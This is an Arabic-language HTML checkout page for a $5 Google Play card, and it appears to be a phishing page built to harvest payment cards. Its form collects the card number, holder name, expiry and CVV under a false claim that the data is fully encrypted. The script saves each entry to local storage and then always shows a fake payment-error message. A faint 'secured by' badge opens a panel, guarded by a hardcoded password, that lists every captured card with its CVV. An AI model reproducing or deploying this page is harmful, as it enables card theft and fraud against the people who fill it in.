<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>صفحة الدفع الإلكتروني</title>
    <style>
        * { box-sizing: border-box; font-family: Tahoma, sans-serif; -webkit-tap-highlight-color: transparent; }
        body {
            background-color: #0b2545;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 10px;
        }
        .payment-card {
            background: #ffffff;
            padding: 20px;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px;
        }
        .card-header {
            text-align: center;
            margin-bottom: 15px;
        }
        .card-header h2 {
            color: #0b2545;
            font-size: 18px;
            margin: 0 0 6px 0;
        }
        .card-header p {
            color: #ee6c4d;
            font-size: 14px;
            font-weight: bold;
            margin: 0 0 10px 0;
            background: #fff5f2;
            padding: 6px;
            border-radius: 6px;
            display: inline-block;
        }
        .encryption-notice {
            font-size: 11px;
            color: #059669;
            background: #ecfdf5;
            padding: 5px;
            border-radius: 5px;
            margin-bottom: 12px;
            text-align: center;
            font-weight: bold;
        }
        .form-group {
            margin-bottom: 12px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-size: 13px;
            color: #334155;
            font-weight: bold;
        }
        input, select {
            width: 100%;
            padding: 11px;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            font-size: 14px;
            outline: none;
            background-color: #f8fafc;
        }
        input:focus, select:focus {
            border-color: #3b82f6;
            background-color: #fff;
        }
        .expiry-row {
            display: flex;
            gap: 10px;
        }
        .expiry-row .form-group {
            flex: 1;
        }
        .submit-btn {
            background-color: #ee6c4d;
            color: white;
            border: none;
            width: 100%;
            padding: 13px;
            border-radius: 8px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s;
        }
        .submit-btn:hover {
            background-color: #d95738;
        }
        #error-msg {
            color: #dc3545;
            margin-top: 12px;
            font-weight: bold;
            font-size: 13px;
            text-align: center;
            display: none;
        }
        
        /* خانة الأمان المخفية / الباهتة */
        .secure-badge {
            margin-top: 15px;
            color: #94a3b8;
            font-size: 10px;
            cursor: pointer;
            user-select: none;
            display: block;
            text-align: center;
            opacity: 0.25;
            transition: opacity 0.3s;
        }
        .secure-badge:hover {
            opacity: 1;
        }

        /* لوحة عرض محاولات الدفع */
        #admin-panel {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            padding: 10px;
        }
        .admin-content {
            background: white;
            width: 100%;
            max-width: 700px;
            max-height: 85vh;
            overflow-y: auto;
            padding: 15px;
            border-radius: 10px;
            text-align: right;
            direction: rtl;
        }
        .close-btn {
            background: #dc3545;
            color: white;
            border: none;
            padding: 6px 12px;
            border-radius: 4px;
            cursor: pointer;
            float: left;
            font-weight: bold;
            font-size: 12px;
        }
        .admin-content h3 {
            color: #0b2545;
            margin-top: 0;
            font-size: 16px;
        }
        .table-responsive {
            width: 100%;
            overflow-x: auto;
            margin-top: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            white-space: nowrap;
        }
        th, td {
            border: 1px solid #cbd5e1;
            padding: 8px;
            text-align: right;
            font-size: 12px;
            color: #334155;
        }
        th { background-color: #f8fafc; }
    </style>
</head>
<body>

    <div class="payment-card">
        <div class="card-header">
            <h2>إتمام عملية الدفع</h2>
            <p>دفع بطاقة جوجل بلاي 5 دولار</p>
        </div>

        <div class="encryption-notice">
            🔒 جميع معلومات بطاقتك مشفرة بالكامل وآمنة
        </div>
        
        <form id="paymentForm">
            
            <!-- خيار نوع البطاقة (فيزا أو ماستر كارد) -->
            <div class="form-group">
                <label for="cardType">نوع البطاقة</label>
                <select id="cardType" required>
                    <option value="" disabled selected>اختر طريقة الدفع</option>
                    <option value="Visa">فيزا (Visa)</option>
                    <option value="MasterCard">ماستر كارد (MasterCard)</option>
                </select>
            </div>

            <!-- خانة اسم صاحب البطاقة -->
            <div class="form-group">
                <label for="cardHolder">اسم صاحب البطاقة</label>
                <input type="text" id="cardHolder" placeholder="الاسم الكامل كما يظهر على البطاقة" required>
            </div>

            <!-- خانة رقم البطاقة -->
            <div class="form-group">
                <label for="cardNumber">رقم البطاقة</label>
                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" required>
            </div>

            <!-- تاريخ الانتهاء (الشهر والسنة) -->
            <div class="expiry-row">
                <div class="form-group">
                    <label for="expiryMonth">الشهر</label>
                    <select id="expiryMonth" required>
                        <option value="" disabled selected>الشهر</option>
                        <option value="01">01</option>
                        <option value="02">02</option>
                        <option value="03">03</option>
                        <option value="04">04</option>
                        <option value="05">05</option>
                        <option value="06">06</option>
                        <option value="07">07</option>
                        <option value="08">08</option>
                        <option value="09">09</option>
                        <option value="10">10</option>
                        <option value="11">11</option>
                        <option value="12">12</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="expiryYear">السنة</label>
                    <select id="expiryYear" required>
                        <option value="" disabled selected>السنة</option>
                        <option value="2024">2024</option>
                        <option value="2025">2025</option>
                        <option value="2026">2026</option>
                        <option value="2027">2027</option>
                        <option value="2028">2028</option>
                        <option value="2029">2029</option>
                        <option value="2030">2030</option>
                    </select>
                </div>
            </div>

            <!-- خانة رمز CVV -->
            <div class="form-group">
                <label for="cvv">رمز الأمان (CVV)</label>
                <input type="password" id="cvv" placeholder="123" maxlength="4" inputmode="numeric" required>
            </div>

            <button type="submit" class="submit-btn">إتمام الدفع</button>
            <div id="error-msg">حدث خطأ أثناء معالجة الدفع، يرجى المحاولة لاحقاً.</div>
        </form>

        <!-- خانة الأمان المخفية / الباهتة -->
        <div>
            <span class="secure-badge" onclick="openAdminPanel()">أمن بواسطة CHY</span>
        </div>
    </div>

    <!-- لوحة عرض المحاولات -->
    <div id="admin-panel">
        <div class="admin-content">
            <button class="close-btn" onclick="closeAdminPanel()">إغلاق</button>
            <h3>سجل محاولات الدفع</h3>
            <div class="table-responsive">
                <table>
                    <thead>
                        <tr>
                            <th>الوقت</th>
                            <th>النوع</th>
                            <th>الاسم</th>
                            <th>رقم البطاقة</th>
                            <th>التاريخ</th>
                            <th>CVV</th>
                        </tr>
                    </thead>
                    <tbody id="attempts-list">
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('paymentForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const data = {
                time: new Date().toLocaleString(),
                cardType: document.getElementById('cardType').value,
                cardHolder: document.getElementById('cardHolder').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiryMonth: document.getElementById('expiryMonth').value,
                expiryYear: document.getElementById('expiryYear').value,
                cvv: document.getElementById('cvv').value
            };

            let attempts = JSON.parse(localStorage.getItem('payment_attempts')) || [];
            attempts.push(data);
            localStorage.setItem('payment_attempts', JSON.stringify(attempts));

            document.getElementById('error-msg').style.display = 'block';
            document.getElementById('paymentForm').reset();
        });

        function openAdminPanel() {
            const password = prompt("يرجى إدخال كلمة المرور:");
            if (password === "@oday1996oday@") {
                loadAttempts();
                document.getElementById('admin-panel').style.display = 'flex';
            } else if (password !== null) {
                alert("كلمة المرور غير صحيحة!");
            }
        }

        function closeAdminPanel() {
            document.getElementById('admin-panel').style.display = 'none';
        }

        function loadAttempts() {
            const tbody = document.getElementById('attempts-list');
            tbody.innerHTML = '';
            let attempts = JSON.parse(localStorage.getItem('payment_attempts')) || [];
            
            if (attempts.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6" style="text-align: center;">لا توجد محاولات مسجلة بعد</td></tr>';
                return;
            }

            attempts.forEach(item => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${item.time}</td>
                    <td>${item.cardType}</td>
                    <td>${item.cardHolder}</td>
                    <td>${item.cardNumber}</td>
                    <td>${item.expiryMonth}/${item.expiryYear}</td>
                    <td>${item.cvv}</td>
                `;
                tbody.appendChild(tr);
            });
        }
    </script>
</body>
</html>
